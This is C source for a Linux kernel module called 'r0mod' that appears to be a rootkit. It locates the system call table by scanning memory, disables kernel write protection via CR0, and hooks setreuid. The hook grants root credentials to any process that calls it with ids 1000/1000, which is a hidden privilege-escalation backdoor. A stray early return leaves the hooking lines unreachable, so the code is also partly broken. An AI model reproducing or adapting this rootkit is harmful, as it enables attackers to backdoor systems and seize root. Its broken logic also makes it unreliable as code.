#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include <linux/unistd.h>
#include <linux/syscalls.h>

#include <asm/paravirt.h> /* write_cr0 */

#include <r0mod/global.h>

#define SEARCH_START    PAGE_OFFSET - 0x000f0000
#define SEARCH_END      PAGE_OFFSET //+ 0x01000000//0x4fffffff //0xffffffff

unsigned long *syscall_table;

asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);

asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
{
    printk("[Correct]: ruid == %d && euid == %d\n", ruid, euid);

    if((ruid == 1000) && (euid == 1000))
    {
        printk("[Correct]: You got the correct ids.\n");
        commit_creds(prepare_kernel_cred(0));

        return new_setreuid(0, 0);
    }

    return orig_setreuid(ruid, euid);
}

unsigned long *find_sys_call_table(void)
{
    unsigned long i;

    for(i = SEARCH_START; i < SEARCH_END; i += sizeof(void *))
    {
        unsigned long *sys_call_table = (unsigned long *)i;

        if(sys_call_table[__NR_close] == (unsigned long)sys_close)
            return sys_call_table;
    }

    return NULL;
}

static int __init r0mod_init(void)
{
    printk("Module starting...\n");

    printk("Search Start: %lx\n", SEARCH_START);
    printk("Search End:   %lx\n", SEARCH_END);

    syscall_table = find_sys_call_table();
    if(!syscall_table)
    {
        printk("syscall_table == NULL\n");
        return 0;
    }

    printk("sys_call_table hooked @ %lx\n", (unsigned long)syscall_table);
    return 0;
    write_cr0(read_cr0() & (~0x10000));

    orig_setreuid = (void *)syscall_table[__NR_setreuid];
    syscall_table[__NR_setreuid] = new_setreuid;

    write_cr0(read_cr0() | 0x10000);

    return 0;
}


static void __exit r0mod_exit(void)
{
    printk("Module ending...\n");

    if(syscall_table)
    {
        write_cr0(read_cr0() & (~0x10000));

        syscall_table[__NR_setreuid] = orig_setreuid;

        write_cr0(read_cr0() | 0x10000);
    }
}

MODULE_LICENSE("GPL");
module_init(r0mod_init);
module_exit(r0mod_exit);
